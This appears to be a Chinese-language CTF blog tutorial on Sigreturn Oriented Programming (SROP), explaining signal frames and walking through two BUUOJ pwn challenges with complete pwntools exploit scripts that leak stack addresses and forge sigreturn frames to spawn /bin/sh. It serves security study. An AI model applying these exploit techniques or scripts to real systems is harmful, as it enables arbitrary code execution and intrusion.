---
title: SROP
date: 2023-07-15 14:08:30
tags: [Pwn,Stack,SROP]
cover: "https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROPcover.jpg"
---

在之前的文章中，我们介绍了[ret2syscall](https://wutong01304.github.io/2023/07/09/ret2syscall/)，即控制程序执行系统调用。而SROP就是利用一个名为 sigreturn 的系统调用进行返回导向编程。与ROP相比，SROP具有可重用性，不太依赖于可执行文件的内容，这使得在大量应用程序中重用相同的SROP代码成为可能。除此之外，SROP还适用于不同的指令集体系结构和操作系统。

# 一、基本原理

SROP (Sigreturn Oriented Programming) 于2014年[1]被提出。

[1]Bosman E, Bos H. Framing signals-a return to portable shellcode[C]//2014 IEEE Symposium on Security and Privacy. IEEE, 2014: 243-258.

文章的主要贡献如下：

1. 提出了一种新的通用开发技术，称为面向sigreturn的编程（SROP），在某些情况下，它不需要事先了解受害者应用程序，并产生可重复使用的“shell代码”；
2. 提出了 一种基于SROP的新型隐身后门技术
3. 给出绕过苹果 iOS 安全模型的系统调用代理示例
4. 证明了SROP是图灵完备的；
5. 提出了可能的缓解技术。

首先我们需要了解什么是sigreturn？

sigreturn是一个与信号处理相关的系统调用，用于将控制权从信号处理程序中恢复到被中断的进程。当一个进程接收到一个信号时，系统会将控制权转移到信号处理程序，该程序可以执行一些特定的操作，例如打印日志或修改进程状态。在信号处理程序执行完成后，进程需要恢复执行被中断的程序。这时，可以使用sigreturn系统调用来将控制权从信号处理程序中返回。如图所示：

图片来源于https://yangtf.gitee.io/ctf-wiki/pwn/stackoverflow/advanced_rop/#srop

![](https://yangtf.gitee.io/ctf-wiki/pwn/stackoverflow/figure/ProcessOfSignalHandlering.png)

当系统进程发起（deliver）一个 signal 的时候，该进程会被短暂的挂起（suspend），进入内核①，然后内核对该进程保留相应的上下文，跳转到之前注册好的 signal handler 中处理 signal②，当 signal 返回后③，内核为进程恢复之前保留的上下文，恢复进程的执行④。

内核为进程保留相应的上下文的方法主要是：将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址，此时栈的情况是这样的：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s1.png?x-oss-process=style/watermark)

我们称 ucontext 以及 siginfo 这一段为 signal frame，需要注意的是这一部分是在用户进程的地址空间，之后会跳转到注册过 signal handler 中处理相应的 signal，因此，当 signal handler 执行完成后就会执行 sigreturn 系统调用来恢复上下文，因此我们可以利用之前压入的寄存器的内容，在系统回复进程执行时，对应的寄存器就会还原成我们构造的寄存器内容。

32 位的 sigreturn 的系统调用号为 77，64 位的系统调用号为 15。

# 二、攻击过程

题目：https://buuoj.cn/challenges#360chunqiu2017_smallest 。

反汇编发现，只有下面这些代码：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s2.png?x-oss-process=style/watermark)

xor rax,rax，将rax寄存器的内容与自己异或，也就是为0
mov edx 400h  mov rsi rsp  mov rdi rax，就是syscall用到的参数。

| 系统调用  | 调用号 | 函数原型                                                     |
| :-------: | :----: | ------------------------------------------------------------ |
|   read    |   0    | read(int fd, void *buf, size_t count)                        |
|   write   |   1    | write(int fd, const void *buf, size_t count)                 |
| sigreturn |   15   | int sigreturn(...)                                           |
|  execve   |   59   | execve(const char *filename, char *const argv[],char *const envp[]) |

syscall 调用的是 rax 的 0，所以这里就是 syscall(0,0,$rsp,0x400) 所以程序实际执行的是 read(0,$rsp,0x400)，也就是往栈顶写 0x400 字节的内容。SROP 主要是利用了第 15 号sigreturn 从栈上读取数据，赋值到寄存器中，然后构造 syscall(59,"/bin/sh",0,0)。

值得注意的是，尽管我们可以利用rsp将start地址写入栈，但是无法利用rsp控制栈。因此为了控制栈，我们需要得到栈地址，也就是使用write函数，将栈地址打印出来。然后再构造sigreturn，利用sigreturn执行我们自己构造的函数。

## 2.1 **多次利用syscall**

如图所示，执行syscall前，esp=0x7fffffffe590（图1），输入1234，执行后，esp被放入1234（图2），执行ret后，esp下移一位，即0x7fffffffe598（图3）。如果我们输入的不是1234而是一个地址时，就会跳转到这个地址去执行。

图1：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s3.png?x-oss-process=style/watermark)

图2：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s4.png?x-oss-process=style/watermark)

图3：

![](F:/%E6%88%91/%E5%B7%A5%E4%BD%9C/blogs/SROP/s5.png)

因此若我们将栈顶写为start_addr的地址时，syscall就会再次执行，若输入多个start_addr时，就会多次执行syscall。按需求，我们使用system一次性发送三个start_addr，如下：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s6.png?x-oss-process=style/watermark)

算上发送这三个start_addr的地址syscall(read)，syscall将会被执行四次。

## 2.2 **构造write**

利用rax，使调用号为1，调用write。

read函数如果读取成功，就会返回实际读到的字节数，并存进rax寄存器（大多数函数的返回值都由rax寄存器控制），因此，我们可以利用第一个start_addr执行，输入一个字符，将rax寄存器置为1，这样再一次执行syscall的时候，执行的就是write函数了。

但是，第一条指令为xor rax,rax，会修改寄存器，因此为了防止rax寄存器被改变，我们输入’x\b3’字符，使得第2个start_addr的0x4000B0的后两位’B0’被修改为’B3，也就是第2行mov rdx,400h的地址0x4000B3。这样，当syscall执行后，就会返回到0x4000B3执行，跳过异或rax的指令。

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s7.png?x-oss-process=style/watermark)

当转到第2个start_addr\b3执行，write函数会从rsp位置开始读取长度为0x400的数据。因此我们可以知道栈地址是多少，由于此时rsp指向第3个stack_addr，此时我们可以利用的栈首地址为8字节之后，即stack_addr = u64(sh.recv()[8:16])。

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s8.png?x-oss-process=style/watermark)

## 2.3 构造sigreturn

write执行完以后，会返回到第3个start_addr地址执行，也就是再次调用syscall(read)，此时将我们的payload发出，就会被写入栈了，然后就可以构造sigreturn了。

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s9.png?x-oss-process=style/watermark)

```python
payload = p64(start_addr) + p64(syscall_ret) + str(read)
payload[8:8+15]= syscall_ret + ****(add to 15)#第2段payload不会改变原来的payload
```

为了使程序接着执行，我们将paylade的前8个字节构造为start_addr。即payload发送以后，会再次执行start_addr，也就是syscall(read)，此时我们输入15个字符使其rdx=15，为调用sigreturn做准备。然后会转到syscall_ret执行，也就是0x4000BE，此时rdx为15，执行syscall就是执行sigreturn。

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s7.png?x-oss-process=style/watermark)

sigreturn会触发中断，将我们构造好的read函数参数（栈中的）给放到寄存器上（会清除栈里面的read_frame），然后执行read函数，等待接收。

## 2.4 构造 execve

此时，再次输入payload，将payload写入栈。由于我们设置esp（返回地址）是syscall_ret，中断执行完后会调用syscall 15，即read函数，而设置的read函数参数为stack_addr，即会将接收到的数据写入stack_addr的地址，之前的栈空间会被覆盖。

同样，为了使得程序继续执行，我们将第一个地址构造成start_addr，为了执行execve，我们需要再次触发中断，第2个地址同样构造为syscall_ret。

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s10.png?x-oss-process=style/watermark)

```python
payload=p64(start_addr)+p64(syscall_ret)+str(execve)
payload=payload+(0x120-len(payload ))*'\x00'+'/bin/sh\x00'(补到120字符，并加上/bin/sh)
payload[8:8+15]= syscall_ret + ****(add to 15)#第2段payload不会改变原来的payload
```

当再次触发中断时，会将execve函数参数放到寄存器中，由于我们将esp即中断的返回地址设为syscall_ret，所以当它返回时，就会调用execve（syscall 59），而execve参数的位置为stack_addr+120。因此当execve执行时，会调用/bin/sh（rdi=stack_addr+20的位置），执行shell。

完整exp：

```python
#coding=utf8
from pwn import *
sh = remote("node4.buuoj.cn",27207)
small = ELF('./smallest')
syscall_ret = 0x004000BE
start_addr = 0x004000B0
payload = p64(start_addr) * 3
sh.send(payload)#首先,发送start_addr的地址,因为是写在栈顶的,所以就是read的返回地址，会返回到start_addr
sh.send('\xb3')
#返回后再次调用read函数的时候输入一个字节,read函数会把读入的字节数放到rax，达到了rax置为1
#同时会把rsp的后一位写为\xB3,这样返回地址就不是start_addr了，而是4000B3,这就避免了rax被xor置零
stack_addr = u64(sh.recv()[8:16])
log.success('leak stack addr :' + hex(stack_addr))#现拿到栈的地址
read = SigreturnFrame()
read.rax = constants.SYS_read
read.rdi = 0
read.rsi = stack_addr
read.rdx = 0x400
read.rsp = stack_addr
read.rip = syscall_ret #相当于read(0,stack_addr,0x400),同时返回地址是start_addr
read_frame_payload  = p64(start_addr) + p64(syscall_ret) + str(read)
sh.send(read_frame_payload)#调用read函数,等待接收
sh.send(read_frame_payload[8:8+15])#总共是15个，使得rax为15
sleep(1)
execve = SigreturnFrame()
execve.rax=constants.SYS_execve
execve.rdi=stack_addr + 0x120
execve.rsi=0x0
execve.rdx=0x0
execve.rsp=stack_addr
execve.rip=syscall_ret
execv_frame_payload=p64(start_addr)+p64(syscall_ret)+str(execve)#返回start_addr等待输入
print len(execv_frame_payload)
execv_frame_payload_all=execv_frame_payload+(0x120-len(execv_frame_payload ))*'a'+'/bin/sh\x00'#填充到0x120，然后再填上'/bin/sh'
sh.send(execv_frame_payload_all)
sleep(1)
sh.send(execv_frame_payload_all[8:8+15])
sh.interactive()
```

成功拿到flag:

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s11.png?x-oss-process=style/watermark)

## 2.5 一道简单的例题

题目：https://buuoj.cn/challenges#ciscn_2019_s_3 

反汇编观察vuln函数：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s12.png?x-oss-process=style/watermark)

- proc定义子程序的伪指令,它和endp 分别表示子程序定义的开始和结束两者必须成对出现。
- var存储字节的数组，长度为0x10
- xor rax rax，异或操作，将rax寄存器置为0。
- mov edx, 400h 将edx寄存器的值设置为了0x400
- lea rsi, [rsp+var_10] 将rsp+var_10的地址传入寄存器rsi
- mov rdi, rax，将rax寄存器的值（也就是0）传给rdi

因此，第一个syscall也就相当于read(0,var,400h)，即这里可以溢出，溢出大小为0x10。类似地。第二个syscall也就相当于write(1,var,30h)，将var地址输出。

我们的思路是，通过触发系统中断sigreturn，设置寄存器的值，使其调用execve（‘bin/sh,0,0）

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s13.png?x-oss-process=style/watermark)



sigreturn的调用号为15，再给出的gadgets中，刚好有mov rax, 0Fh，也就是把rax置为15，execve的调用号为59，gadgets中，也有mov rax, 3Bh。

我们首先通过read、write正常执行，将bin/sh字符正常写入，并获得其地址，然后再次返回到vuln执行。这时我们先通过read函数溢出，转到0x04004DA执行，使rax为15，然后返回的时候（mov rax, 0Fh的下一条是ret），使其转到syscall（第二个syscall避免rax被改变）执行，就触发了系统中断，此时将我们设置好的寄存器传入，使其返回的时候执行syscall，这样就可以执行execve了。

```python
payload1='/bin/sh\x00'.ljust(16,'a')+p64(vuln_addr)#写入bin/sh
payload2='a'*16+p64(sigreturn_addr)+p64(syscall_addr)+str(frameExecve)#利用pwntools实现execve的寄存器布置（其实也可以自己来）
frameExecve=SigreturnFrame() 
frameExecve.rax =constants.SYS_execve #系统调用号，也就是rax=59
frameExecve.rdi =binsh_addr #bin/sh的地址
frameExecve.rsi =0  #execve的其它参数
frameExecve.rdx =0  #同上
frameExecve.rip =syscall_addr #返回到syscall
```

然后我们计算bin/sh的地址，write函数在打印时，打印了0x30的内容，但var却只有0x10，因此会将其它地址打印出来，只要打印出栈地址，算出该地址的偏移和/bin/sh的相对偏移，就可以知道bin/sh的地址了。

当前栈地址为rsp 0x7fffffffdea0，因此bin/sh的地址为rsp-0x10=0x7fffffffde90，打印0x20的内容后，会打印0x7fffffffdeb0（rsp+0x10）的内容：0x00007fffffffdfa8

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s14.png?x-oss-process=style/watermark)

打印出来的栈地址为0x00007fffffffdfa8，即偏移为：0x00007fffffffdfa8-0x7fffffffde90 = 0x118
计算bin/sh地址：binsh_addr=u64(p.recv(8))-0x118 #接收地址，计算偏移

完整exp:

```python
from pwn import *
p=remote('node4.buuoj.cn',29247)
sigreturn_addr = 0x4004DA
syscall_addr = 0x400517
vuln_addr=0x4004f1
payload = '/bin/sh\x00'.ljust(16,'a')
payload+=p64(vuln_addr)
p.sendline(payload)
p.recv(0x20)
binsh_addr=u64(p.recv(8))-0x118
frameExecve=SigreturnFrame()
frameExecve.rax =constants.SYS_execve
frameExecve.rdi =binsh_addr
frameExecve.rsi =0
frameExecve.rdx =0
frameExecve.rip =syscall_addr
payload ='a'*16
payload+=p64(sigreturn_addr)+p64(syscall_addr)+str(frameExecve)
p.sendline(payload)
p.interactive()
```

成功获取flag：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s15.png?x-oss-process=style/watermark)

